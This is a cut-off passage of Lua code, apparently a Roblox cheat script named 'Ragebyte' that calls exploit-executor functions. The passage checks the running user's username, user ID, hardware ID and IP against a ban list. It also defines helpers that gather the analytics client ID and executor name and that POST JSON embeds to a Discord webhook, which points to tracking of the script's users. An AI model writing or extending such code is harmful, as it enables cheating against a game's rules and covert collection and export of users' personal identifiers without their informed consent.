    --print("HWID    :", string.format("%q", tostring(current_hwid)))
    --print("IP      :", string.format("%q", tostring(current_ip)))

    local matches = {}

    if blacklist[tostring(current_user)] then
        table.insert(matches, "Username")
    end

    if blacklist[tostring(current_id)] then
        table.insert(matches, "UserID")
    end

    if blacklist[tostring(current_hwid)] then
        table.insert(matches, "HWID")
    end

    if blacklist[tostring(current_ip)] then
        table.insert(matches, "IP")
    end

    if #matches > 0 then
        warn("BAN MATCHES: " .. table.concat(matches, ", "))

        --print("\n=== MATCH DETAILS ===")

        if blacklist[tostring(current_user)] then
            --print("Username matched:", current_user)
        end

        if blacklist[tostring(current_id)] then
            --print("UserID matched:", current_id)
        end

        if blacklist[tostring(current_hwid)] then
            --print("HWID matched:", current_hwid)
        end

        if blacklist[tostring(current_ip)] then
            --print("IP matched:", current_ip)
        end

        --print("=========== BAN CHECK END ===========")
        return true
    end

    --print("No matches found")
    --print("=========== BAN CHECK END ===========")
    return false
end

local function send_to_discord(webhook_url, embed_data)
    local payload = game:GetService("HttpService"):JSONEncode({
        username = "Ragebyte",
        embeds = {embed_data}
    })
    
    pcall(function()
        request({
            Url = webhook_url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
end

local function get_full_hwid()
    local executor_name = getexecutorname and getexecutorname() or identifyexecutor and identifyexecutor() or "Unknown"
    local player = game:GetService("Players").LocalPlayer
    local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
    local full_hwid = "User_" .. (clientId or tostring(player.UserId))
    return full_hwid, executor_name
end

local function get_avatar_headshot(user_id)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(user_id) .. "&width=420&height=420&format=png"
end

local function get_unique_id(ip, full_hwid, user_id)
